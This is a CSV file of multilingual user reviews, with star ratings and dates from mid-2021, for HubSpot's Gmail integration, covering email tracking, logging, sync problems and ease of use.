User Review,Star Rating,Date
positivamente para cumplir con los requerimientos y las metas establecidas,5 of 5,Sep 14 2021
It makes it easier to do my job on a daily basis. I find it helpful and easy to use.,4 of 5,Sep 13 2021
Helps with tracking and organization. Ease of searching and finding emails through keywords.,4 of 5,Sep 13 2021
En general funciona bien y me da cobertura a la mayoría de las necesidades que tengo en comunicación.,5 of 5,Sep 13 2021
The hub spot GMail integration didn't work for me it said I don't have an email account associated with,1 of 5,Sep 12 2021
Reply Emails Not Tracked. Wished They Were. When sending emails thru HubSpot the original email seems to contain tracking info but subsequent replies to the same thread dont seem to auto-integrate and need to be logged manually. not sure if this is the case or if we are just using the features incorrectly.,2 of 5,Sep 10 2021
Tricky to manage Tickets by using emails. easy to track emails by using HubSpot plugin,3 of 5,Sep 10 2021
This is one of the better Gmail integrations out there. All emails can be tagged if you want to track them if yes the contact gets created in HubSpot existing contacts the mail is linked as a communication history. You can tag the email to be linked to contact deal and/or organization. Amazing tool to keep track of communication history.,5 of 5,Sep 10 2021
I don't know how I would function without this integration. I've used both gmail and outlook and I would say that the outlook plugin is more useful mainly because I'm able to easily schedule new tasks while in gmail. There is some room for improvement however.,4 of 5,Sep 9 2021
Did not integrate Gmail to hubs pot kdkdkdkdkdkkdkdkdkdkdkkdkdkdkdkkdkdkkdkdkdk,1 of 5,Sep 9 2021
However for me personally at least 90% of the emails I'm sending out aren't in interest for the HubSpot plugin. I'm missing a feature where every time I write an email HubSpot isn't automatically set to track and log every email but instead I would have to add this when relevant.,2 of 5,Sep 9 2021
It often is a company process to ensure everyone is making their correspondence visible to the rest of the company. In previous years most CRMs would allow this by bcc'ing a set address. This wasn't ideal  people forget these rules so the gmail integration makes this foolproof,5 of 5,Sep 7 2021
Did not work at all. Could Not Properly Integrate with the companies contact list.,1 of 5,Sep 7 2021
Gmail is the best emailing service and it's FREE! Couldn't be happier with the integration of Gmail.,5 of 5,Sep 7 2021
It works great BUT you should use the GMail extension (which I had to figure out myself) or EVERYTHING from Gmail will end up in HubSpot.,4 of 5,Sep 7 2021
I installed HubSpot and I use it along side my Gmail it seems to work very well.,5 of 5,Sep 7 2021
Está a funcionar muito bem. Estou muito satisfeita com o Gmail e também com o HubSpot. Duas áreas que se complementam na perfeição.,5 of 5,Sep 6 2021
Gmail funciona perfectamente rápido y con seguridad no tengo problema en ese sentido,1 of 5,Sep 3 2021
The Gmail/HubSpot integration is super helpful - use templates tracking follow-up task creation and much more.,5 of 5,Sep 3 2021
Pela metade apenas os e-mails que envio pelo HubSpot ficam registrador o contrario não.,2 of 5,Sep 2 2021
It makes it very efficient to be able to work directly from HubSpot or from Gmail and switch as needed while missing nothing in the paper trail.,5 of 5,Sep 2 2021
Google Workspaces works just fine. But I don't like the HubSpot integration all that well because I feel that it relies on too much additional plugins. For example if I want good email tracking I have to use a Chrome extension to get the job done or send all emails from within HubSpot. Otherwise I have to manually BCC my HubSpot address each time. That is not the ideal solution for me because I prefer using Firefox and I don't want to have two tabs open for redundancy. Furthermore I do not receive all mail in HubSpot. Let me actually integrate HubSpot with Gmail without jumping through so many hoops.,3 of 5,Sep 2 2021
Ha sido genial la facilidad de uso la integración con correos y reuniones nos ha permitido hacer un seguimiento efectivo a nuestros clientes.,5 of 5,Sep 2 2021
Me parece excelente herramienta para el control general de los sistemas de CRM de la empresa,5 of 5,Sep 2 2021
Everything now takes longer and is not able to use on Mac Mail or Mac Outlook which is disastrous. Please fix.,2 of 5,Sep 2 2021
O serviço é muito excelente. Obrigada pelas funcionalidades liberadas para nós clientes HubSpot.,5 of 5,Sep 2 2021
As ferramentas Google são excelentes. Sugiro ao HubSpot liberar um campo a mais para ser editável na hora de marcar a reunião.,5 of 5,Sep 2 2021
Works perfectly with HubSpot. Love the all my HS tools are available to use out of gmail.,5 of 5,Sep 2 2021
una buena aplicacion sin embargo le hace falta mas fucnionalidades.............,4 of 5,Sep 1 2021
Gmail works very well with powerful features and few limitations: however HubSpots integration disables some of those features (e.g scheduled send) and is generally resource heavy causing Gmail to choke and become unstable. The logging and tracking options are sometimes unreliable appearing to track when set not to.,3 of 5,Sep 1 2021
I am a new HubSpot user. So far I like the ability to keep up with my email and when they have been read. I like that the emails are logged by individual versus each email entry. I really appreciate the ability to add a task based off of the email that you're tracking. Thank you for your wonderful tool!,5 of 5,Sep 1 2021
Easy to use. Helps me track when a client opens an email. Would recommend to everyone.,5 of 5,Sep 1 2021
Fine - I am not sure why you Are so nosey about gmail - when Hubsppot Is The issue,1 of 5,Sep 1 2021
Working good. It is helping me a lot in reaching out to prospect leads and google/zoom invites.,3 of 5,Sep 1 2021
Brings all my tools to one place easy to find and interact with. Also visually appealing,5 of 5,Sep 1 2021
We are Google partner and their products have an enormous impact on everything we do and how we organize.,5 of 5,Sep 1 2021
Gmail is working well with other plugins on my website. It has also expanded my business online and compatible with my website,1 of 5,Aug 31 2021
No funciona. No se integra no me funciona. Lo he intentado todo y seguido los pasos. Gracias.,1 of 5,Aug 31 2021
Es buen programa fácil de usar pero al momento de utilizar con un teléfono celular no es tan práctico.,4 of 5,Aug 31 2021
Integration is simple yet powerful. It provide us a 360 degree view of communications with customers and partners.,5 of 5,Aug 31 2021
Gmail is very supportive and with features that address all requirements.,3 of 5,Aug 31 2021
It would be good if when customers emailed us to our gmail direct that it also came up on the CRM not just outgoing emails and responses.,4 of 5,Aug 31 2021
I live by Google. And Google connected to HubSpot is even better - I certainly can track sale conversions much easier,5 of 5,Aug 31 2021
Everything is fine with Gmail. Except for the supports. but your CRM has lost the desire to use. I'm afraid that something else will break.,1 of 5,Aug 30 2021
stuggling with how to organize and effectively communicate with GMAIL. Not a fan.,2 of 5,Aug 30 2021
excelente todo muchas gracias por tan excelente integración me ha servido mucho,5 of 5,Aug 30 2021
Integration make communication with clients and work tasks so much easier. Highly recommend.,5 of 5,Aug 28 2021
We use Google Business Suite to host our email. This is my third attempt at using a CRM and HubSpot is by far the best. It's easy to set up including its integration with Gmail. It's so convenient that I'd rather access email in HubSpot than in Outlook or Gmail.,5 of 5,Aug 28 2021
Muito bom. Iremos iniciar com HubSpot em alguns dias. Porem é uma ferramenta bem completa.,4 of 5,Aug 27 2021
The connectivity with HubSpot is simple and provides great automation and time saving.,5 of 5,Aug 27 2021
I love Gmail as I manage 4 accounts and it makes easy to keep up with them all.,2 of 5,Aug 27 2021
Never been able to make it function. Using web based and email client based. Just doesn't function.,1 of 5,Aug 26 2021
Works as expected not s useful as YesWare because you have to go to HubSpot for the activity summary.,4 of 5,Aug 26 2021
Install configure and off you go. Easy for those of us who use gmail natively.,5 of 5,Aug 26 2021
I'm very satisfied. Can't say much as it works out of the box. The setup is literally a couple of clicks especially if you're already logged in both HubSpot and Gmail.,5 of 5,Aug 26 2021
I use google for Email and task management but HubSpot keeps on crashing. It also logs every single email automatically I would actually prefer to choose which one to log.,1 of 5,Aug 26 2021
Gmail works great as long as it is not integrated with HubSpot. Once it was integrated my emails were blocked by the firewalls of my largest clients and the only way to get my emails through was to lose the integration then have their IT team allow access for every individual that I'd contacted during the time my Gmail was integrated with HubSpot.,1 of 5,Aug 25 2021
Es una herramienta indispensable para las empresas como apoyo a las estrategias digitales,5 of 5,Aug 25 2021
quiero la conexion de HubSpot solamente con uno de los dos emails pero no puedo desconectar el que no quiero...,2 of 5,Aug 25 2021
I just integrated Hub and Gmail - Gmail could be simpler and smarter to use.,4 of 5,Aug 25 2021
Gamil and HubSpot are the best combination i believe because it saves our time by being on same platform and dual work happening.,5 of 5,Aug 25 2021
Excelente muchas funciones integradas fáciles de usar ayudándote a ser más productivo,5 of 5,Aug 25 2021
está funcionando muito bem é essencial na minha atividade troco muitos e-mail com clientes no dia a dia.,5 of 5,Aug 24 2021
Not every single email I send needs to be logged in HubSpot this needs to be more intuitive.,2 of 5,Aug 24 2021
ha funcionado muy bien y tenemos todo en un solo lugar. podemos revisar toda la informacion en HubSpot,5 of 5,Aug 24 2021
G-Mail molto efficiente robusto il miglior software per la gestione della posta elettronica ma non solo...,5 of 5,Aug 24 2021
Funciona bien y nos permite manejar mejor la información a nivel de áreas para entregar una atención más rápida y personalizada,5 of 5,Aug 23 2021
O Google Mail é bom e barato. Atende as necessidades da empresa no momento.,2 of 5,Aug 23 2021
it is working ok however sometimes we have difficulties with the syncro between HubSpot and gmail this caused problems with meeting scheduling..which is pretty important for us,2 of 5,Aug 23 2021
Permet de résoudre les problèmes à tempsréduire le coût sur tous les plans.,4 of 5,Aug 21 2021
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,3 of 5,Aug 19 2021
Es muy funcional ya que podemos estar conectados todos los miembros de mi empresa sin necesidad de tener una red física y super bien para estar conectados en estos tiempos de trabajo a distancia,5 of 5,Aug 19 2021
It has made follow up with clients seamless and easy to remember everything!,5 of 5,Aug 18 2021
It's good. I like that it shows when emails were opened and that it creates new contacts automatically. Easy to keep track of what was said and when.,4 of 5,Aug 18 2021
When I connected Gmail it seems I lost tracking of emails. Now it says 170 emails sent and zero opened. That seems near impossible,3 of 5,Aug 18 2021
Gmail is a great format especially for low to medium revenue companies that do not have a lot of resources,5 of 5,Aug 18 2021
Great we use it for everything. It makes everything so simple being able to sync calendars and send invites via gmail is very helpful.,5 of 5,Aug 18 2021
Lo uso desde siempre es la mejor herramienta de correo y para mí poder unificarlo con el CRM es imprescindible,5 of 5,Aug 18 2021
Gmail is the standard that all email platforms should strive for. Easy to use and straightforward. All features needed.,5 of 5,Aug 17 2021
En general bien. Funciona de maravilla se integra facil con todas las aristas de un negocio u empresa.,5 of 5,Aug 17 2021
It made my work much easier and faster. It log and track every email I send or receive :),5 of 5,Aug 17 2021
Very well. I can't write 75 characters worth of stuff to fill up a whole review.,5 of 5,Aug 17 2021
do not like it at all this is horrible to work with. Do not like to work on gmail at all.,1 of 5,Aug 17 2021
Gmail es excelente pero no se vincula bien con HubSpot y eso es lo que necesito. poder ver si abrieron mi mail,1 of 5,Aug 16 2021
Funciona bien se integra perfecto solo algunas veces falla la conexión con otras apps,3 of 5,Aug 16 2021
I dunno why HubSpot is so terrible when it comes to email deliverability please note.,1 of 5,Aug 16 2021
me ayuda mucho tiene excelentes apps  es una excelente herramienta de trabajo.,5 of 5,Aug 16 2021
Creo que podría ser más atractiva y debería ofrecer información más relevante o útil para realizar acciones dentro de Gmail.,2 of 5,Aug 13 2021
Todo bien con la herramienta hasta el momento. Satisfecho en general._________,5 of 5,Aug 12 2021
Me ha funcionado para lo que quiero sin embargo aún no tengo la disponibilidad para hacer el seguimiento de clics a enlaces que pongo en los correos desde gmail,3 of 5,Aug 12 2021
It works okay I like the tracking and seeing how many times someone opens or interacts with the emails. Not crazy about them automatically being added to the database. Maybe I want to wait until they respond or sign up to the product for real. thanks,3 of 5,Aug 12 2021
,5 of 5,Aug 12 2021
Features like template and document helps me save time and storage space. I also like how i can schedule meetings via zoom and link it to my Google calendar.,5 of 5,Aug 12 2021
Con una mayor interacción entre los usuarios internos y externos en la empresa sin duda mejora la aplicación de procesos,4 of 5,Aug 11 2021
Without it the process would be very manual. I love how you can pop into the CRM quickly in the sidebar.,5 of 5,Aug 11 2021
This Gmail integration enables me to be perfectly personal as well as keep track of the data that matters to my company.,5 of 5,Aug 11 2021
Funciona muy bien el acceso web desde cualquier ubicación lo valoro mucho así como la integración con toda la solución de Workspace (Calendario Drive Meet entre otros).,5 of 5,Aug 11 2021
Excellent no problem found in using the gmail plus the HubSpot just only wondering to upgrade my permission to be super user so that I can use all of the function  ahaha,5 of 5,Aug 10 2021
Gmail is a great email and the automation by HubSpot speed up processes. You must integrate the email with the CRM,4 of 5,Aug 9 2021
Es un correo que usualmente usan las compañías al no tener correos corporativos y es fácil de usar.,5 of 5,Aug 9 2021
Es muy amigable fácil de usar tiene muchísima integrabilidad con otras aplicaciones en este caso con HubSpot lo que mas me gusta son las notificaciones cuando alguien abre los correos que le envío.,5 of 5,Aug 9 2021
Using it for both personal and work Gmail has been my main email provider for many years. The easy capability of switching between personal and work emails across all my devices and seamless integrations and functionalities (calendar Gmeets etc) keep me organised and would find it difficult to switch to another provider.,5 of 5,Aug 9 2021
Whenever I am making a Task in HubSpot by selecting a particular time and date I am not receiving a update on Gmail about it or Notification,2 of 5,Aug 6 2021
I love it and the integration is one of the best IT applications I am using at the moment.,4 of 5,Aug 6 2021
Bien solo falta que puedas incluir tu firma y que no alenté Gmail que toda tu información quede dentro del cliente y contacto con quien tienes la comunicación me encanta,5 of 5,Aug 6 2021
Gmail werkt prima ik gebruik daarvoor een mailapp. Maar dat je het alleen kan koppelen met HubSpot als je in de browser gmail gebruikt is echt heel karig.,1 of 5,Aug 6 2021
It works when I send the emails it’s very straight forward. Dont know why I have to write 75 characters min.,5 of 5,Aug 6 2021
HS defaults to tracking your email engagement so I kept unchecking boxes to send an email. After a few occurrences of pop up messages I removed the app.,2 of 5,Aug 5 2021
After integrating with HubSpot my Outlook constantly crashes. It freezes at times and also restarts automatically whilst typing an email. In addition at random sometimes my emails continue to reload for no reason eventually crashing my Outlook.,1 of 5,Aug 5 2021
Need to bind an existing E-Mail conversation that runs over a contact to a a ticket.,3 of 5,Aug 4 2021
Amazing it's absolutely crucial for daily operations and managing everything,3 of 5,Aug 4 2021
aaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaa,2 of 5,Aug 4 2021
Todo bien me ha gustado mucho la dinámica para dar un buen seguimiento a mis prospectos,5 of 5,Aug 3 2021
It works great 90% of the time. There are times that the email that comes into gmail does not show up in our conversations inbox.,4 of 5,Aug 3 2021
excelente me ayuda con mandar plantillas y me avisa cuando el cliente ve los correos.,5 of 5,Aug 2 2021
Gmail funktioniert ganz wunderbar mit HubSpot - das ist alles was mir dazu einfällt,5 of 5,Jul 30 2021
Chrome Sales Extension works fine. But just that (not marking emails as read on the HubSpot Inbox) is unacceptable. We wanted to request all the sales reps to only work with the HubSpot Inbox to organize the follow up of leads but it turns out,5 of 5,Jul 29 2021
Good it's very helpful. I am able to reschedule and follow up better. I'm getting ready to really grow my business,5 of 5,Jul 29 2021
The app is pretty good for basic stuff but I'd would really prefer to be able to quickly set and run my tasks in gmail. 1) Hotkeys to create and then quickly set due date. Also navigating the tasks next skip complete... 2) Support for worlds like "next tuesday" or "1 week" or "1 month" etc 3) Ability to see context on tasks rather than having to click on them contact company etc. would be really helpful.,3 of 5,Jul 29 2021
The integration works great! It's easy for users to choose to log and track emails. My only complaint is that you can't sync past emails so users have to remember to Log and/or Track emails while they compose their email.,4 of 5,Jul 28 2021
It's been great connecting all of the employees from all over the world. It's very user-friendly and it integrates with our sales tools well (HubSpot included).,5 of 5,Jul 28 2021
Es hoy uno de los canales de comunicación con Leads y Clientes y es muy efectivo.,5 of 5,Jul 28 2021
Gmail est fiable en termes d'utilisation et avec HubSpot on a un retour sur l'ouverture des mail et l'ouverture des liens .,5 of 5,Jul 28 2021
複数の人に同じ内容を一斉に共有できる。 Ｈｕｂｓｐｏｔの利便性が余り感じられない。　 確認していただいたことが分かるが、返事がないため今までと変わらない気がする。,3 of 5,Jul 28 2021
Excelente muy práctica de integra con muchas aplicaciones y me hace tener todo bajo control en un mismo lugar,5 of 5,Jul 28 2021
Google suit is very helpful and integrated. I believe Gmail make things easier by login in different platforms.,4 of 5,Jul 27 2021
Gmail HubSpot integration is awesome and i love how seamless the experience is.,5 of 5,Jul 27 2021
Moving from classic mailbox to full Google Workspace changed our way of working. No return hopefully,5 of 5,Jul 27 2021
Am not Satisfaction. compare to other CRM its very commercial on free version no such advantages.,1 of 5,Jul 27 2021
Everything is good except the situations when mail sent in Gmail is not saved in HubSpot. It happened like with 5 % of sent emails.,3 of 5,Jul 27 2021
It's needed to communicate with clients. There's also a need of google drive in order to maintain the client databases.,3 of 5,Jul 27 2021
Facile pour garder une trace de tous les échanges avec prestataires clients etc.,5 of 5,Jul 26 2021
It has increased the performance by faster and accurate database and quick responce,5 of 5,Jul 26 2021
Muita agilidade para realização do controle de todo o CRM da empresa diversas ferramentas importantes,5 of 5,Jul 24 2021
HubSpot tasks has never worked in my Gmail. Additionally creating contacts and leads is not an instant thing; each contact or lead takes about 5 minutes to load into the HubSpot so I can't log certain emails right away.,2 of 5,Jul 23 2021
A integração funciona bem todas os agendamentos são registrados automaticamente e eu também consigo enviar e-mails por dentro do Hub que aparecem no Gmail.,5 of 5,Jul 23 2021
ik haal het uiterste er nog niet uit. kan er meer uit halen. kost me in begin veel tijd.,4 of 5,Jul 23 2021
I enjoy that I have access to all my working and emails at the same time and can access between various applications.,3 of 5,Jul 22 2021
Gmail is alright on mobile HubSpot however isn't mobile friendly since I can't send images or files through the HubSpot app.,1 of 5,Jul 22 2021
The best I can say is that it's minimally functional. Essentially consider it mostly a "view only" window into HubSpot which has clearly decided it wants you to "live in" the HubSpot web app all day rather than work out of Gmail. For context we migrated from Copper CRM to take advantage of HubSpot's complete suite--CRM sales hub marketing hub customer service hub etc. Copper can't match the functionality of having everything in one place. That said it's shocking to me that a vastly smaller company by comparison could be light years beyond HubSpot when it comes to Gmail integration. Our sales team has always worked out of the inbox. Copper allowed them to do that because there wasn't any day-to-day deal/opp management functionality that existed in the web app that didn't exist in the Chrome extension. This allowed our sales team to quickly and easily manage every aspect of a related contact company and deal/opp record without ever leaving Gmail. It was such a good experience that I simply presumed a company of HubSpot's size and cost would be at least as good if not better. I was wrong.,2 of 5,Jul 21 2021
essential tool for client ability to coordinate their schedule with mine. Ease of use from my clients who are appreciative.,3 of 5,Jul 21 2021
Funciona muy bien la integración en general con los correos de gmail en el navegador,5 of 5,Jul 21 2021
HubSpot is a very very very slow platform. Probably the slowest CRM I have ever used.,1 of 5,Jul 21 2021
Muy bien es una herramienta muy util que me ha permitido comunucarme y poder trabajar en conjuntomcon otras app,5 of 5,Jul 21 2021
Es muy facil integrar los contacto de Gmail con la aplicación. FAcil acceso y seguimiento de correos,5 of 5,Jul 21 2021
NO FUNCIONA LA INTEGRACION TIPO IMAP CON HubSpot; SE HIZO POR CELULAR  SE HIZO POR COMPUTADORA Y NO SE SINCRONIZA.,1 of 5,Jul 21 2021
Gmail works fine but HubSpot integration with Gmail I think is terrible! i don't like it,3 of 5,Jul 20 2021
Gmail works extremely good for me and our organization. Helps us reduce all the distance between our offshore customer base.,5 of 5,Jul 20 2021
It's a great tool that can track when an email is opened and to register some conversations in HS that are important to have in the CRM,5 of 5,Jul 20 2021
Esta impresión también puede ser aplicada destinada a ser acordada destinada por todos. En términos de valores aplicando una combinación de medios; de elementos de tamaño sectores y países distintos. Que califico de 'teal - integrales' y que retrata.,5 of 5,Jul 19 2021
Overall HubSpot and Gmail work together pretty well. No issues for me,5 of 5,Jul 19 2021
It works well but one thing that is very difficult is not being able to have the ability to organize my inbox using folders or segmentation. It crowds my inbox and makes my life a bit more difficult when I am seeing hundreds of emails daily.,3 of 5,Jul 16 2021
Gmail + HubSpot es un buen equipo porque te ayuda a dar seguimiento a los correos que envías a tus clientes y visualizar todas las acciones que realizan.,4 of 5,Jul 16 2021
Sim. Funciona bem acesso fácil. Somente o Maill track poderia ser ilimitado sem custo.,4 of 5,Jul 16 2021
At this point it appears to be performing well. So you're prompting me to say more...? This is very strange HubSpot. I gave you an honest reply.,4 of 5,Jul 16 2021
So far so good. However not all features are available on the app vs. desktop,5 of 5,Jul 15 2021
After setup It's a complete breeze to use HubSpot. It's the only CRM I have ever used so my standards are high for any future positions I hold where I need to use a CRM.,5 of 5,Jul 15 2021
Like I said I'm fairly new to this system so I'm still at the newbie stage. I will report later once I have got used to using the system.,4 of 5,Jul 15 2021
Ecosystème complet qui permet une synchronisation avec mon téléphone mobile,5 of 5,Jul 15 2021
Working very well all the features have helped our team gather leads in HubSpot through Gmail,5 of 5,Jul 15 2021
Funciona perfectamente en torno a cantidad de documentos que se pueden enviar orden y coordinación que puedo tener con mis clientes.,5 of 5,Jul 14 2021
Very useful to have all my business email connected to HS so I can track the record of all my communication and have my teammates aware of what's going on,5 of 5,Jul 14 2021
The integration works very well. There's one improvement I'd like to see. Currently it tracks every communication including ones with my coworkers. It would be nice to have a way to tell the tool to ignore certain domains (not just individual users).,5 of 5,Jul 13 2021
We really need inbound emails that we do not reply to to be able to be logged in HS. It seems odd that this is an issue!,3 of 5,Jul 13 2021
Overall the integration is great. There are some slight recommendations I would offer to HubSpot for improvement as I'm sure this is a popular integration.,3 of 5,Jul 13 2021
sehr gut bin sehr zufrieden. Funktioniert sehr genau. Zeitsparend.,5 of 5,Jul 13 2021
Excelente puedo usar mis contactos de celular para enviarles emails,5 of 5,Jul 13 2021
Love it! Integrates perfectly. Does what I need it to do. You don't have to switch back and forth between Google Workspace and HubSpot.,5 of 5,Jul 12 2021
HubSpot est le seul logiciel à s'intégrer parfaitement avec Gmail ou Outlook. Généralement les CRMs ne permettent pas de consigner et de suivre les emails en dehors de leur application. HubSpot est le seul logiciel à permettre le suivi et la consignation des emails depuis Gmail.,5 of 5,Jul 12 2021
It amazing,5 of 5,Jul 12 2021
I love that I can see opens to know that the message got to my prospect. I also like how it is easy to create contacts and tasks right out of Gmail.,5 of 5,Jul 12 2021
Es muy bueno. Excelente. ¿Qué más querés que te diga? 👀 👀👀👀👀👀👀👀👀👀👀👀👀👀👀👀👀,5 of 5,Jul 11 2021
It helps to keep track to all my clients create tasks and so much more. Its my go to CRM!,5 of 5,Jul 10 2021
A little more difficult following up in HubSpot and seeing new emails outside of HubSpot.,2 of 5,Jul 10 2021
All my line ups are sorted. Easy to track activity done on my leads. Its super easy.,5 of 5,Jul 10 2021
Me gusta gmail en general es una buena herramienta de comunicación y almacenamiento de información valiosa para mi organizacion,4 of 5,Jul 9 2021
HubSpot is very straight forward and easy to use. It made handling employee concern better and faster. It streamlined our processes and made the team's response time more efficient.,5 of 5,Jul 9 2021
Gmail + HubSpot together have helped save me time and helped my business drastically. Every day I learn something new I am finding a way to save myself time every day. As a Realtor and someone who works 2 jobs every minute counts! Don't know how I went so long without this product.,5 of 5,Jul 9 2021
The two completely different HubSpot integrations for shared accounts vs individual accounts confuses the team and limits our ability to track all emails well. In addition any email sent from HubSpot appears to go directly to clients' Promotions folder which is about as bad as Spam..,3 of 5,Jul 8 2021
Was apprehensive about using gmail over outlook however once you get used to it it's user friendly. Combined with GSuite its a great platform,5 of 5,Jul 8 2021
This is better to friendly use. Work nicely as Gmail mentioned to us I really enjoyed to use this,5 of 5,Jul 8 2021
It works as expected and provides good features and integrations to other G-Suite products.,5 of 5,Jul 7 2021
Muy bien esta bien integrado la usabilidad y la experiencia como usuario es fantastica.,5 of 5,Jul 7 2021
it does not work with HubSpot due to limitations. needs to run in chrome in stead of safari can only log 10 adresses at once while using a mailing list. very limited very inefficient.,2 of 5,Jul 7 2021
Gmail has been the go-to of businesses globally and its nice that HubSpot created an integration between two platforms making it easy to keep track of daily business,5 of 5,Jul 7 2021
Is my company mail so we are using the platform to manage customer communication activities as well as to edit some documents,4 of 5,Jul 7 2021
Great but sometimes the integration of HubSpot and Gmail tend to glitch and not properly forward emails to HubSpot,3 of 5,Jul 6 2021
Gmail has via HubSpot is seamless and it has all the functionality that I needed plus the tracking if someone has opened and accessed the email sent.,5 of 5,Jul 6 2021
i dont feel the value is complicated to use other crm tools are winning HubSpot,2 of 5,Jul 6 2021
Me permite tener un mejor historial de actividades teniendo visibilidad de actibidades,5 of 5,Jul 6 2021
Gmail and HubSpot are working hand in hand and its very keeping track of mails,5 of 5,Jul 5 2021
No sabría valorarla aún pues la configuración no es fácil. Sé que tiene mucho más potencial incluso la versión gratuita pero me falta conocer mejor la forma de configurarlo,2 of 5,Jul 4 2021
The UX and UI is good but the notifications are misleading at times. Giving false notification of open rates,3 of 5,Jul 2 2021
Has always been the best tool for companies everyone aligns easily to work targets,5 of 5,Jul 2 2021
The Tracking and Log Option's DON'T Work. I have reached out to HubSpot team for support but it still does not work for me. I have to manually add emails to BCC so that I can track and Log the emails in the HubSpot CRM,1 of 5,Jul 2 2021
I can't believe how much I can do from Gmail that syncs directly into the HubSpot CRM. It is easy to set-up tells me when clients open their emails logs my emails directly in the CRM under the correct contacts companies and deal records. Not only that but I can create tasks and deals straight from Gmail to reduce the need to jump back and forth which helps me streamline my day. I have been using this integration for nearly 6 years now at multiple companies and it just keeps getting better and better.,5 of 5,Jul 2 2021
Funciona perfectamente nos permite tener un mayor control del manejo de datos y requerimientos de cada uno de nuestros clientes,5 of 5,Jul 1 2021
Gmail itself works very well. When several email accounts are deployed it makes sense to use something like MS Outlook to reign them all into one environment.,1 of 5,Jun 30 2021
it is just okay ... im still trying to get familiarize with the gmail and how it works with HubSpot.,4 of 5,Jun 30 2021
Generally good. Have to remember to start a new thread from inside HubSpot.,4 of 5,Jun 30 2021
Excellent; we have enjoyed using Gmail but the HubSpot integration solves some key problems we experienced with trying to share customer service emails that are responded to by multiple representatives.,4 of 5,Jun 29 2021
Muy bien excepto por Meets que no es muy amigable para presentar y ver la cámara de mi interlocutor.,5 of 5,Jun 29 2021
Estamos empezando pero por el momento estoy conociendo el CRM de HubSpot para entender de mejor forma la integración con Google.,5 of 5,Jun 29 2021
It's helpful to keep track of the mails and to send the same without have to be going through a lot of hassle.,5 of 5,Jun 29 2021
Good integration. Makes prospecting a breeze. Also helps in monitoring all sales activities in one go,5 of 5,Jun 29 2021
The HubSpot integration with my Gmail has made it so convenient to keep track of all my different efforts; and the tracking feature (together with Notes etc) I don't have to duplicate efforts to keep records. I also like how I can opt NOT to log and track some emails since I do use this Gmail account for some other communication for a second business.,5 of 5,Jun 28 2021
Muy bien es una buena forma de contactarse con los clientes que demuestran estar interesados con nosotros.,5 of 5,Jun 28 2021
Normal  no me aporta otra cosa que al enviar un email por gmail me lo carga en el historial del contacto esto es lo único rescatable,3 of 5,Jun 28 2021
